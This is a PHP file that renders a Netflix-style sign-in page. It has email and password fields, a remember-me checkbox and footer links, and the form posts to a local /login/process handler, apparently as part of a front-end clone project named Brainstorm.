<?php
function login() {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Page</title>
        <link rel="stylesheet" href="/Brainstorm/assets/css/login.css?v=<?php echo time(); ?>">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.10.0/font/bootstrap-icons.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="logo">
            <img src="/Brainstorm/assets/images/logo.svg" alt="Logo">
        </div>

        <main>
            <div class="login-container">
                <h2>Sign In</h2>
                <form class="login-form" id="login-form" action="/login/process" method="post">
                    <div class="input-group">
                        <input class="gaya-input" type="text" id="karma-user" name="karma-user" placeholder="Email or mobile number">
                        <label for="karma-user">Email or mobile number</label>
                        <div class="pesan-error">
                            <small id="user-error" class="error-message"></small>
                        </div>
                    </div>
                    <div class="input-group password-container">
                        <input class="gaya-input" type="password" id="karma-password" name="karma-password" placeholder="Password">
                        <label for="karma-password">Password</label>
                        <span id="toggle-password" class="bi bi-eye" onclick="togglePassword(event)"></span>
                        <div class="pesan-error">
                            <small id="password-error" class="error-message"></small>
                        </div>
                    </div>
                    <button type="submit" class="login-btn">Sign In</button>
                    <p class="forgot-password"><a href="#">Forgot password?</a></p>
                    <div class="checkbox-container">
                        <input type="checkbox" id="remember-me" class="custom-checkbox">
                        <label for="remember-me">Remember me</label>
                    </div>
                    <div class="newto">
                        <p> New to Netflix? <a href="#"> Sign up now. </a> </p>
                    </div>
                    <div class="recaptcha-text">
                        <p> This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#"> Learn more. </a></p>
                    </div>
                </form>
            </div>
        </main>

        <div class="footer">
            <p href="#" class="footer-question">Questions? Call <a>007-803-321-8275</a></p>
            <div class="footer-links">
                <a href="#">FAQ</a>
                <a href="#">Help Center</a>
                <a href="#">Terms of Use</a>
                <a href="#">Privacy</a>
            </div>

            <div class="footer-s">
                <a href="#">Cookie Preferences</a>
                <a href="#">Corporate Information</a>
            </div>

            <div class="english-select">
                <div class="custom-dropdown">
                    <div class="dropdown-selected">
                        <i class="bi bi-translate"></i> English
                    </div>
                    <div class="dropdown-options">
                        <div class="dropdown-option" data-value="english"><i class="bi bi-translate"></i> English</div>
                        <div class="dropdown-option" data-value="spanish"><i class="bi bi-translate"></i> Spanish</div>
                        <div class="dropdown-option" data-value="french"><i class="bi bi-translate"></i> French</div>
                        <div class="dropdown-option" data-value="german"><i class="bi bi-translate"></i> German</div>
                        <div class="dropdown-option" data-value="chinese"><i class="bi bi-translate"></i> Chinese</div>
                    </div>
                </div>
            </div>
        </div>
        <script src="/Brainstorm/assets/js/login.js" defer></script>
    </body>
    </html>
    
    <?php
    }
?>